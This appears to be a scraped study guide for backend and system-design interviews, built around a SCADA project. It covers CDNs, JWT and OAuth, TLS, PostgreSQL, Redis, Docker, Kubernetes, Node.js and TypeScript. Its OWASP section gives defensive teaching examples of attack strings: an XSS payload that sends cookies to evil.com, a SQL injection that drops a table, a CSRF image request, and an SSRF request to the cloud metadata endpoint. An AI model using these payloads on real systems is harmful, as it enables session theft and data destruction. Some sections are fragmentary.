Algorithms: Round robin (default, even distribution), Least connections (best for variable request duration — send to least busy server), IP hash (same client always hits same server, for non-Redis session storage), Weighted (more traffic to powerful servers).
🌍
CDN
How CDN works: Edge PoPs globally. User request routes to nearest PoP. Cache hit: served immediately (20–50ms). Cache miss: PoP fetches from origin, caches, serves. Subsequent users at that PoP get cached response regardless of origin location.
What to cache: Static assets with content-hash filenames (JS/CSS bundles): Cache-Control: max-age=31536000, immutable — cached forever, new deploy = new hash = automatic cache bust. Public API responses with short TTL (60–300s). Never cache: authenticated responses, write endpoints, WebSocket connections.
For your SCADA: React build served from Cloudflare CDN (free tier, 200+ PoPs). API and WebSocket on a VPS with direct connection (CDN does not proxy WebSocket well without Workers). COMTRADE files in S3 + CloudFront with signed URLs (temporary, authenticated access only — operators should not be able to share raw fault data links publicly).
Cache invalidation: Content-hash filenames: automatic (new hash = new URL). Manual purge via Cloudflare/CloudFront API on deploy. Surrogate-Key (Cache-Tag) headers: tag responses with data identifiers, purge by tag when data changes. ETags + If-None-Match: conditional requests — server returns 304 Not Modified if content unchanged, saving bandwidth.

Authentication & authorization — the full picture
Authentication vs AuthorizationAuthentication = who are you? Authorization = what are you allowed to do? These are distinct — a user can be authenticated but not authorized for a specific resource. Conflating them is the #1 OWASP vulnerability (Broken Access Control).
JWT deep diveThree base64url-encoded parts: header.payload.signature. Header: algorithm (HS256 or RS256). Payload: claims — sub (user ID), exp (expiry), iat (issued-at), role, permissions. Signature: cryptographic hash of header+payload using secret. Server validates signature on every request — no DB lookup needed. Stateless auth.
HS256 vs RS256: HS256 = HMAC with shared secret — simple but every service that validates tokens needs the secret. RS256 = RSA with private/public key pair — auth server signs with private key, all services verify with public key (safe to share). Use RS256 for your SCADA system — Node.js backend, FastAPI ML service, and future services all verify independently without sharing a secret.
Access + Refresh token pattern: Access token: short-lived (15 min), JWT, stored in memory (JS variable — lost on page reload). Refresh token: long-lived (7–30 days), opaque string stored in DB/Redis, sent as HttpOnly cookie (inaccessible to JS — XSS-proof). On access token expiry: client silently calls POST /auth/refresh with cookie, gets new access token. Server can revoke refresh tokens for logout or security incidents. On page load: call /auth/refresh immediately to restore session before showing login screen.
OAuth 2.0 + OIDC: Authorization Code + PKCE for web/mobile apps (most secure). Client Credentials for machine-to-machine (no user). Implicit flow is deprecated — never use. For "Sign in with Google": redirect to Google, approve, get auth code, exchange for ID token (OIDC), create/find user in DB, issue your own JWT. Never forward the Google access token to your API — issue your own.
OWASP Top 10 — memorize all of these
🔓
Broken Access Control (#1)
IDOR: Change /invoices/1234 to /invoices/1235 — read another user's invoice. API never checked ownership.
Fix: Always server-side ownership check: WHERE id=$1 AND user_id=$2. Deny by default. Never trust client-side restrictions. Use UUIDs not sequential IDs to prevent enumeration.
SCADA: Operator role must not be able to call the admin endpoint to modify relay settings. Check role on every request in middleware, not just at login.
💉
SQL Injection (#3)
Attack: '; DROP TABLE users; -- as username in string-concatenated SQL destroys your database. Modern variant: blind injection to exfiltrate data one bit at a time.
Fix: Parameterized queries always: db.query('SELECT * FROM users WHERE email = $1', [email]). ORMs use parameterization by default — raw queries bypass this. Review every raw query.
Also: NoSQL injection exists too — MongoDB $where operator can execute arbitrary JS. Validate and sanitize all user input regardless of database type.
📜
XSS — Cross-Site Scripting (#3)
Stored XSS: Attacker posts <script>fetch('evil.com?c='+document.cookie)</script> as a comment. Every user who views it exfiltrates their cookies/tokens.
Fix: React escapes JSX output by default. dangerouslySetInnerHTML bypasses this — sanitize with DOMPurify first. CSP header: script-src 'self' blocks inline scripts. Never store JWT in localStorage — XSS reads localStorage.
DOM XSS: document.innerHTML = location.hash — attacker crafts URL with script in hash. Fix: never assign user-controlled values to innerHTML, outerHTML, document.write.
🌐
CSRF & SSRF
CSRF: Attacker site has <img src="bank.com/transfer?to=attacker&amount=1000">. Browser sends victim's cookie automatically. Fix: SameSite=Strict cookie attribute — browser blocks cross-site cookie sending. CSRF tokens for legacy architectures.
SSRF: API fetches a user-supplied URL. Attacker passes http://169.254.169.254/latest/meta-data/ — reads AWS IAM credentials. Fix: whitelist allowed domains. Block private IP ranges (10.x, 172.16.x, 192.168.x, 169.254.x) at the network egress layer.
SCADA relevance: If your SCADA API accepts a URL parameter for importing data, an attacker could SSRF to internal RTU addresses. Validate and whitelist all URL inputs. Only accept URLs from known substation IP ranges.
TLS/HTTPS — encryption in practice
TLS 1.3 handshake: Client sends ClientHello (supported ciphers, random value). Server sends ServerHello (chosen cipher, certificate, random value). Client verifies certificate against trusted CA store. Both derive session keys from the random values. Encrypted communication begins. TLS 1.3 = 1 RTT (vs 2 RTT for TLS 1.2). 0-RTT session resumption = zero extra round-trips for returning clients.
Certificate chain: Your server cert → signed by Intermediate CA → signed by Root CA. Browsers trust Root CAs (built into OS/browser). Let's Encrypt issues free 90-day certs via ACME protocol. Certbot automates renewal. Required for: HTTPS, WSS, MQTT over TLS (port 8883). Add TLS to every service in your SCADA stack from month 11.
HSTS: Header Strict-Transport-Security: max-age=31536000; includeSubDomains tells browsers to always use HTTPS for this domain. Once seen, browser refuses HTTP connections. Prevents protocol downgrade attacks. Add to your Nginx config from day one.
Certificate pinning for SCADA gateways: Your Python Modbus gateways connecting to the central MQTT broker should verify the broker's specific certificate hash — not just any valid certificate. Prevents MITM attacks where an attacker installs their own valid cert on the network path. Store expected cert fingerprint in gateway config. Required by IEC 62351-3 for production utility deployments.

What it covers: IEC 62351 is the security companion to IEC 61850. Part 3: TLS profiles for TCP/IP protocols. Part 4: MMS security. Part 5: DNP3 security. Part 8: Role-based access control for power systems. Implementing any of these differentiates your SCADA from competitors who treat security as an afterthought.
Your implementation checklist: MQTT over TLS port 8883 (Part 3 equivalent). Certificate-based auth for gateway connections — not just username/password. JWT with role claims for all API access (Part 8 RBAC). VLAN segmentation: process bus isolated from corporate network. Audit trail with tamper-evident logging (hash chain or signed log entries). These are what TCN and NERC require for compliance audits.

PostgreSQL — relational database mastery
ACID transactionsAtomicity: all operations succeed or all roll back — no partial writes. Consistency: all constraints satisfied after commit (FK, unique, NOT NULL, check). Isolation: concurrent transactions cannot see each other's intermediate state. Durability: committed data survives crashes via Write-Ahead Log (changes written to WAL before data pages — replayed on crash recovery). Use PostgreSQL for: payments, user accounts, SCADA audit trail, alarm event log. Not for: time-series measurements (use InfluxDB).
Isolation levels: Read Committed (Postgres default) — only see committed data, non-repeatable reads possible. Repeatable Read — same query returns same rows within a transaction. Serializable — transactions appear sequential, safest, slowest. Most apps work fine with Read Committed. Use Serializable for inventory management (oversell prevention) or financial transfers where phantom reads cause incorrect results.
Locking: Optimistic locking — read version number, update only if unchanged (WHERE id=$1 AND version=$2), increment version. Good for low-contention reads. Pessimistic locking — SELECT ... FOR UPDATE acquires row lock, blocks concurrent modifications. Good for high-contention scenarios (breaker control: only one operator commands at once). Deadlock prevention: always acquire locks in the same global order.
Connection pooling: Opening a DB connection is expensive (TCP handshake, auth, session). PgBouncer or pg library pool maintain N pre-established connections shared across requests. Without pooling: 100 concurrent requests = 100 DB connections = degraded performance, risk of hitting Postgres connection limit. Pool size guideline: (CPU cores × 2) + effective_spindle_count, typically 10–20 per app server.
Indexing — the most impactful optimization
Without index: SELECT * FROM orders WHERE user_id = 42 on 10M rows = full table scan = 10M row reads for 5 results. With B-Tree index on user_id: O(log n) lookup. Seconds → milliseconds. Every heavily-queried column needs an index.
B-Tree index: Balanced sorted tree. Supports: equality (WHERE id=42), range (WHERE created_at > date), ORDER BY, LIKE with leading constant (LIKE 'john%' yes, LIKE '%john' no). Default index type in PostgreSQL and MySQL.
Composite index + leftmost prefix rule: Index on (user_id, created_at, status) satisfies queries on: user_id alone, user_id+created_at, all three. Cannot be used for: created_at alone, status alone. Column order in the index definition matters enormously. Design around your actual query patterns.
Covering index: Index contains all columns the query needs (SELECT + WHERE + ORDER BY). Query answered from index alone without reading the main table. Called index-only scan. Example: index on (user_id, created_at DESC) covers SELECT user_id, created_at FROM posts WHERE user_id=? ORDER BY created_at DESC LIMIT 20.
EXPLAIN ANALYZE — always verify: EXPLAIN (ANALYZE, BUFFERS) SELECT ... shows actual query plan, execution time, rows examined, buffer hits. Look for: Index Scan (good) vs Seq Scan on large tables (potential problem). Never assume an index is being used. Verify with EXPLAIN after creating every index.
Index cost: Every INSERT/UPDATE/DELETE updates all indexes on the table. 10 indexes = 10x write amplification. Index based on actual query patterns from EXPLAIN output, not guesswork. Partial indexes reduce size: CREATE INDEX idx_pending ON orders(user_id) WHERE status='pending'.
Redis — in-memory data structure store
What Redis is: In-memory key-value store with rich data structures: Strings, Lists, Hashes, Sets, Sorted Sets, Streams, Bitmaps. ~100,000 operations/second. Optional persistence: RDB snapshots (point-in-time) or AOF (append-only log of every command). Data must fit in RAM — Redis is not a primary database for large datasets.
Cache-aside pattern: Check Redis → cache hit: return immediately → cache miss: query PostgreSQL → store in Redis with TTL → return. Application controls cache explicitly. Invalidate by deleting key on data update. Your SCADA uses this for: relay settings (rarely change, frequently read), substation configuration, user session data.
Atomic rate limiting: INCR ratelimit:user:42 (atomic increment) + EXPIRE ratelimit:user:42 60 (expire in 60s). If count exceeds limit, return 429. Atomic — no race condition possible. ~100k checks/second on a single Redis. Your SCADA API needs rate limiting on the breaker control endpoint — critical infrastructure commands should be rate-limited to prevent accidental or malicious flooding.
Pub/Sub for horizontal WebSocket scaling: When you run multiple Node.js instances (for availability), each holds different WebSocket connections. Incoming MQTT measurement → write to InfluxDB + publish to Redis channel → ALL Node.js instances subscribed to that channel broadcast to their connected clients. Every operator sees every update regardless of which backend instance handles their WebSocket connection. This pattern scales your SCADA backend horizontally without message loss.
Sorted Sets for time-series in memory: ZADD feeder:F1:power <timestamp> <value>. ZRANGEBYSCORE feeder:F1:power -inf +inf retrieves chronologically. Keep last 1 hour in Redis for instant dashboard load. Historical beyond 1 hour from InfluxDB. Hybrid: fast recent data from Redis, full history from InfluxDB on demand.
Database selection guide
📊
When to use what
PostgreSQL: Relational data, ACID transactions, complex queries with JOINs. User accounts, alarm events, relay configurations, RBAC, audit trail, billing.
InfluxDB: Time-series measurements. High write throughput. Automatic downsampling and retention. SCADA measurements, sensor readings, telemetry data.
Redis: Caching, sessions, rate limiting, pub/sub, queues, leaderboards. Sub-millisecond access. Data that fits in RAM and is acceptable to lose on crash (if no persistence configured).
Elasticsearch: Full-text search, log analytics. Your SCADA alarm event search — "find all earth fault alarms on KAINJI substation in Q3" — is better served by Elasticsearch than LIKE queries on PostgreSQL at scale.
🔑
Schema design principles
Normalization first: Eliminate redundancy. Each fact stored once. Start normalized — denormalize specific bottlenecks only after EXPLAIN ANALYZE identifies them.
Primary key strategy: BIGSERIAL: sequential, fast inserts, exposes count. UUID v4: random, globally unique, not guessable but causes B-Tree fragmentation on large tables. UUID v7: time-ordered + globally unique — best of both worlds for new systems.
Timestamps: Always store in UTC. Use TIMESTAMPTZ in PostgreSQL (stores UTC, displays in client timezone). Never store local time — your SCADA serves operators across Nigerian time zones and potentially beyond.
Soft deletes: For audit trail integrity, never hard-delete records. Add deleted_at TIMESTAMPTZ column. Filter with WHERE deleted_at IS NULL. Your SCADA compliance reports may need to reference "deleted" relay configurations that were active during a historical period.

Docker — containerization in depth
What a container is: A process running with isolated namespaces — own filesystem (from image layers), network namespace, process namespace, mount namespace. Shares the host OS kernel (unlike VMs which have their own). Starts in milliseconds. Near-zero overhead vs host processes. The isolation guarantees: whatever runs on your laptop runs identically in production — no more "works on my machine".
Dockerfile layer caching — critical for fast builds: Each instruction adds a cached layer. Key pattern: COPY package*.json ./ then RUN npm ci BEFORE COPY . .. Dependency installation is cached as long as package.json does not change. Source code changes do not invalidate the dependency layer. Without this: every source change triggers a full npm install in CI. Slow CI = slow iteration = frustrated team.
Multi-stage builds — smaller production images: Stage 1 (builder): install ALL dependencies including devDependencies, compile TypeScript, run tests. Stage 2 (production): FROM node:20-alpine, COPY only compiled output + production node_modules from builder stage. No TypeScript compiler, no Jest, no source maps in production. Node.js app: 1.2GB (full devDeps) → 150MB (production). Smaller image = faster pull = faster deploy = smaller attack surface.
Docker Compose for your SCADA stack: One YAML file defines: mosquitto (MQTT), influxdb, postgres, redis, node-backend, python-gateway, nginx (serving React build). Networks: internal (backend services only), public (only nginx). Volumes: data persistence for InfluxDB, Postgres, Mosquitto. docker compose up -d starts everything. docker compose down stops it. This is how your SCADA deploys at a substation site on a local server.
Security in Dockerfiles: Never run as root — add USER node (or USER nobody). Never put secrets in images — use environment variables injected at runtime or Docker secrets. Use specific image tags (node:20.11.0-alpine3.19 not node:latest) for reproducibility. Scan with docker scout or Snyk. Multi-stage builds eliminate build tools from production images.
Kubernetes — orchestration for production scale
☸️
Core abstractions
Pod: Atomic unit. One or more containers sharing network namespace. Usually 1 container per pod. Ephemeral IP — changes when pod restarts. Never communicate with pods directly by IP, use Services.
Deployment: Declares desired state: "run 3 replicas of this pod image". Controller reconciles actual vs desired continuously — crashed pod is replaced automatically. Rolling update: creates new pod, waits for readiness probe, deletes old pod. kubectl rollout undo reverts in seconds.
Service: Stable DNS name + IP that load-balances across pod replicas. Types: ClusterIP (internal), NodePort (external via node IP), LoadBalancer (provisions cloud LB). Your Node.js backend Service is reachable as node-backend inside the cluster regardless of pod IP changes.
Ingress: Routes external HTTP/HTTPS to Services by hostname/path. Nginx Ingress Controller is most common. api.scada.com → node-backend-svc. TLS termination with Let's Encrypt certs via cert-manager. Single entry point for all external traffic.
⚖️
Scaling and reliability
HPA (Horizontal Pod Autoscaler): Watches CPU/memory/custom metrics. Scales replicas between min and max automatically. Traffic spike → CPU exceeds 70% → HPA scales from 3 to 20 pods in under a minute. After spike → scales back. Cost efficient.
Resource requests and limits: Requests = what pod needs (used for scheduling). Limits = hard cap (pod killed if exceeded). Set on every container. Without limits: one runaway pod starves others on the same node.
Readiness vs Liveness probes: Readiness: is pod ready for traffic? Failing removes from Service endpoints. Liveness: is pod alive? Failing triggers container restart. Your Node.js backend readiness probe checks DB + Redis connectivity before accepting requests — prevents routing traffic to an unready backend during startup.
Secrets: Never bake secrets into images. K8s Secrets (base64 encoded, encrypted at rest in etcd) injected as env vars or mounted files. For production: use AWS Secrets Manager or HashiCorp Vault with K8s External Secrets operator — secrets managed outside the cluster, synced in.

Node.js architecture, REST API design, WebSocket patterns, message queues, caching strategies. The server side of every system you build on both tracks.
Node.js architecture — interview-depth understanding
Single-threaded event loop: One main thread. All JS runs on it. I/O (network, file, DB) offloaded to OS via libuv and handled asynchronously. Callbacks/promises queued when I/O completes. This is why Node.js handles thousands of concurrent connections efficiently — it never blocks waiting for I/O, it just registers a callback and moves on to the next task.
The CPU blocking problem: Synchronous CPU-intensive work (image processing, large JSON parsing, complex computation) blocks the event loop — ALL other requests stall during that work. Solutions: Worker Threads (separate OS thread for CPU work, no shared memory, communication via postMessage), child_process.fork (separate process), or offload to a Python worker via message queue. For your SCADA: COMTRADE file parsing (potentially large binary files) must go to a Worker Thread to keep the event loop free for real-time MQTT messages.
Memory leaks in production: Common causes: event listeners added but never removed (accumulate over WebSocket connection lifetime), global variables growing without bound, closures holding references to large objects longer than needed. Detection: expose process.memoryUsage().heapUsed as a metric, watch for monotonic growth. Tool: Node.js --inspect + Chrome DevTools heap snapshot identifies which objects hold references. Fix: always remove event listeners in cleanup/disconnect handlers.
Clustering for multi-core utilization: Node.js uses 1 CPU core by default. Cluster module forks N worker processes sharing the same port — OS distributes connections. PM2 handles clustering, restart-on-crash, log aggregation, zero-downtime reload. For your SCADA backend on a 4-core server: 4 Node.js workers behind Nginx load balancer, all connected to shared Redis for WebSocket state and session data.
REST API design — interview-ready depth
Resources are nouns, never verbs: /substations, /substations/KAINJI/feeders/F1/measurements. Not /getSubstation or /createFeeder. For actions that don't map to CRUD: POST /substations/KAINJI/feeders/F1/breakers/CB01/operations creates an operation record — the side effect IS the breaker command.
Idempotency: GET/PUT/DELETE are idempotent — calling N times has same effect as once. POST is not. Use idempotency keys (client-generated UUID sent as Idempotency-Key header) for operations that must not duplicate (breaker control commands, payment processing). Server stores and deduplicates for 24 hours. If the same idempotency key arrives twice, return the same response without executing twice.
Status codes as communication: 200 OK, 201 Created (include Location header), 204 No Content (DELETE success), 400 Bad Request (validation fail — include error detail in body), 401 Unauthorized (not authenticated), 403 Forbidden (authenticated but not allowed — do not return 404 here, that hides resource existence), 409 Conflict (duplicate), 422 Unprocessable (valid JSON but invalid business logic), 429 Too Many Requests (include Retry-After header), 503 Unavailable (include Retry-After).
Cursor-based pagination: GET /measurements?after=cursor_xyz&limit=50. Cursor = encoded last-seen ID or timestamp. Stable with concurrent inserts (new items don't shift pages). Efficient — no COUNT(*) needed. Cannot jump to arbitrary page — fine for infinite scroll and API consumers who process sequentially. Return: {"data":[...],"nextCursor":"cursor_abc","hasMore":true}. Use for your SCADA measurement history API — real-time data makes offset pagination unreliable.
WebSocket — real-time architecture
Protocol: HTTP upgrade → WebSocket handshake → persistent full-duplex connection. WSS (WebSocket Secure) = WebSocket over TLS. Always use WSS in production — plain WS transmits data unencrypted over the network, unacceptable for SCADA control data.
Message protocol design: Every message has a type field: {"type":"MEASUREMENT_UPDATE","substation":"KAINJI","feeder":"F1","data":{...}}. Clients subscribe to specific topics: {"type":"SUBSCRIBE","topics":["substations/KAINJI/feeders/+/measurements"]}. Server maintains a subscription map — on each MQTT message, look up which WebSocket clients subscribed to that topic pattern. Send only to relevant clients — do not broadcast everything to everyone.
Heartbeat and reconnection: Connections drop silently on network interruption, mobile cell handoff, client sleep. Server: send ping frame every 30s, close connection if no pong received within 10s. Client: implement exponential backoff reconnection (1s, 2s, 4s, 8s, 16s, max 30s). On reconnect: client resends its subscription list. This lives in your React useScadaWebSocket(url) custom hook — transparent to the rest of the UI.
Horizontal scaling with Redis pub/sub: Multiple Node.js instances each hold different WebSocket connections. Incoming MQTT measurement → write to InfluxDB → publish to Redis channel. ALL Node.js instances subscribe to that Redis channel → each broadcasts to its connected WebSocket clients. Every operator sees every update regardless of which backend instance their connection lands on.
Caching strategies — the most powerful backend optimization
Cache layers: Browser cache (HTTP Cache-Control) → CDN/Edge (Cloudflare) → Reverse proxy (Nginx) → Application cache (Redis) → Database cache (avoid in most production DBs — overhead outweighs benefit). Each layer intercepts requests before they reach the next. Correct cache placement can reduce DB load by 90%+ for read-heavy workloads.
Cache-aside (most common): App checks Redis → hit: return → miss: query DB → write to Redis with TTL → return. App controls cache explicitly. Invalidate by deleting key on write. Best for: data that changes occasionally (user profiles, relay settings, substation config).
Write-through: Write to cache and DB simultaneously on every write. Cache always fresh. Write latency increases (must wait for both). Best for: data that is written infrequently and read very frequently where stale reads are unacceptable.
Cache invalidation strategies: TTL — cache expires after N seconds (simple, data can be stale up to TTL). Event-based — when data changes, explicitly delete/update cache key (complex but always fresh). Cache versioning — embed version in key (user:42:v3), change version to invalidate all at once without knowing all keys to delete.
HTTP caching headers: Cache-Control: max-age=3600 (browser caches 1 hour). s-maxage=86400 (CDN caches 1 day). ETag (fingerprint of content) + If-None-Match (conditional request — 304 Not Modified if unchanged, no body). Vary: Accept-Encoding (CDN stores separate copies per encoding). For your SCADA React build: immutable assets with content-hash filenames, Cache-Control: max-age=31536000, immutable.

InfluxDB writer is consumer 1. ML anomaly detector is consumer 2. Compliance audit log is consumer 3. Each processes independently at its own pace.

TypeScript Deep Dive
You already know TypeScript from Angular. This fills the gaps — generics, advanced utility types, branded types, discriminated unions, and strict mode. The depth big tech interviews probe.
Advanced type system features
Generics — the most important advanced feature: Parameterize functions and types by a type variable. function identity<T>(arg: T): T { return arg; } — caller decides what T is. Constraints: <T extends object> restricts T. Defaults: <T = string>. Used in: useState<T>, useRef<T>, API response types like ApiResponse<User>, your SCADA measurement types like Measurement<VoltageReading>.
All utility types — memorize these: Partial<T> (all optional), Required<T> (all required), Readonly<T> (all readonly), Pick<T,K> (subset), Omit<T,K> (exclude K), Record<K,V> (object map), Exclude<T,U> (remove from union), Extract<T,U> (keep matching), NonNullable<T> (remove null/undefined), ReturnType<F> (function return type), Parameters<F> (function params as tuple), Awaited<T> (unwrap Promise).
Discriminated unions — for state machines: Union where each member has a common literal property. type AlarmState = {status:'active';severity:'critical'|'major'} | {status:'acknowledged';acknowledgedBy:string} | {status:'cleared';clearedAt:Date}. In a switch on status, TypeScript narrows the type — inside 'acknowledged' branch, acknowledgedBy is known to exist. Use this for your SCADA alarm lifecycle, relay operation states, and connection status modeling.
Branded types — catch unit confusion: type Kilovolts = number & {readonly __brand: 'kV'}. A function that expects Kilovolts will refuse a plain number or Amperes at compile time. Zero runtime cost. Prevents mixing voltage and current values — a real source of bugs in SCADA software where you work with many different electrical quantities simultaneously.
Mapped and conditional types: Mapped: type Nullable<T> = {[K in keyof T]: T[K] | null} — transforms every property. Conditional: type IsArray<T> = T extends any[] ? true : false. Infer: type UnwrapPromise<T> = T extends Promise<infer U> ? U : T — extracts the resolved type of a Promise. These power the utility types you already use — now you understand how they are built.
Strict mode — always on: "strict": true in tsconfig.json. Enables: strictNullChecks (null/undefined not assignable to other types), noImplicitAny, strictFunctionTypes, alwaysStrict. Start every project in strict mode. Retrofitting strict mode to a loose codebase is painful — do it from day one.
TypeScript for your SCADA domain model

CS Fundamentals
Memory, OS concepts, concurrency models, distributed systems theory. What separates engineers who understand their tools from those who only use them.
Memory — how programs actually use RAM
Stack vs Heap: Stack: function call frames, local variables, parameters. LIFO, fast, limited size (typically 1–8MB per thread). Stack overflow = recursion too deep. Heap: dynamically allocated objects (everything in JS, Python objects, Go values escaped from stack). Managed by GC in JS/Python/Go, manually by malloc/free in C/C++. Unlimited size bounded only by RAM.
V8 garbage collection (Node.js/Chrome): Generational GC. Young generation (new allocations, collected frequently with mark-and-sweep — fast because most objects die young). Old generation (long-lived survivors, collected less frequently with mark-compact). GC pause: event loop stops briefly. Large heaps → longer pauses → higher P99 latency. For your SCADA: never accumulate measurements in memory — write to InfluxDB and release the reference promptly. Keep the young generation small for fast GC.
Memory leaks in Node.js: EventEmitter listeners not removed when done — each WebSocket connection that adds listeners must remove them in the 'close' event. Global variables accumulating — caches without TTL-based eviction grow without bound. Closures holding large objects — a timer callback that references a large measurement array keeps it alive until the timer is cleared. Detection: expose process.memoryUsage().heapUsed as a Prometheus metric and watch for monotonic growth over days.
CPU cache hierarchy: L1 (~32KB, ~1ns), L2 (~256KB, ~3ns), L3 (~8MB, ~10ns), RAM (~60ns), SSD (~100µs), network (~1ms). Sequential memory access (arrays) = cache-friendly. Random pointer chasing (linked lists, hash maps with many collisions) = cache-unfriendly. This is why arrays outperform linked lists in practice even for O(1) operations — cache line prefetching makes sequential access near-free.
Concurrency — language models compared
🧵
Threads, processes, race conditions
Process: Own address space, file descriptors, OS resources. Crash isolation. IPC required for communication: pipes, sockets, shared memory, message queues.
Thread: Execution unit within a process. Shares heap, file descriptors, globals. Fast communication (shared memory) but requires synchronization.
Race condition: Thread A reads counter (5), Thread B reads counter (5), A writes 6, B writes 6. Should be 7, is 6. Fix: mutex (only one thread holds lock at a time), atomic operations (hardware read-modify-write), or message passing (no shared state at all).
Deadlock: Thread A holds Lock 1, waits for Lock 2. Thread B holds Lock 2, waits for Lock 1. Neither proceeds. Prevention: always acquire locks in the same global order. Use lock timeouts. Prefer lock-free data structures for high-contention paths.
⚡
Language concurrency models
Node.js: Single-threaded event loop. No shared memory, no race conditions in JS code. Cannot use multiple CPU cores natively. Worker Threads for CPU-intensive tasks (COMTRADE parsing). Cluster for multi-core web serving.
Python: GIL — only one thread executes Python bytecode at a time. Use asyncio + async/await for I/O-bound concurrency (your Modbus + MQTT gateway). Use multiprocessing for CPU-bound work (bypass GIL). asyncio event loop = similar model to Node.js event loop.
Go: Goroutines — ~2KB stack, millions possible, multiplexed onto OS threads. Channels for communication (share by communicating, don't communicate by sharing). Go is the right language for a high-performance SCADA gateway that must handle thousands of device connections with deterministic latency.
Python asyncio for SCADA gateway: asyncio.gather(poll_modbus(), handle_mqtt(), handle_commands()) — three coroutines running concurrently in one thread. Each yields control when waiting for I/O. No threads, no GIL contention, no race conditions. Correct pattern for your Modbus + MQTT gateway code.
Distributed systems — system design interview foundations
CAP theorem: In a distributed system during a network partition (nodes cannot communicate), you can choose either Consistency (every read returns the most recent write) or Availability (every request gets a response, even if stale). You cannot guarantee both. Most real systems choose Availability + Eventual Consistency — data propagates to all nodes eventually. Know examples: Cassandra (AP), HBase (CP), Zookeeper (CP), DynamoDB (tunable). Your InfluxDB cluster is AP — temporary partition means some nodes may have slightly stale data.
Eventual consistency: After a write, different nodes may return different values briefly but will converge. Acceptable for: social media feeds, DNS, product catalogs. Not acceptable for: financial balances, inventory counts. Your SCADA: InfluxDB measurements are eventually consistent across replicas. Alarm thresholds are checked on the primary replica only — alarm triggering logic must never run on an eventually-consistent read.
Consistent hashing: Distribute load across N servers such that when a server is added or removed, only K/N keys need to be remapped (not all keys). Used by Redis Cluster, Cassandra, CDN PoP selection. Interview favorite because it's non-obvious and has clean algorithmic properties. The virtual node trick handles uneven distribution when N is small.
Saga pattern for distributed transactions: Cannot use DB transactions across microservices boundaries. Saga: sequence of local transactions with compensating transactions for rollback. Order saga: reserve inventory → charge payment → schedule shipment. If shipping fails: refund payment → release inventory. Each step has a defined compensation. Your SCADA breaker control workflow: acquire exclusive control lock → send command → wait for feedback → release lock. If feedback times out: send cancel command → release lock → alert operator. This is a saga.
Idempotency in distributed systems: Any operation that can be safely retried multiple times with the same result. Critical when network calls can fail after the server has already processed the request. Your SCADA breaker control API must be idempotent — if the operator's click reaches the server, the server issues the command, but the HTTP response is lost in the network, the retry must not issue a second command. Idempotency key (UUID per operation) stored in Redis with the result — deduplication on retry.
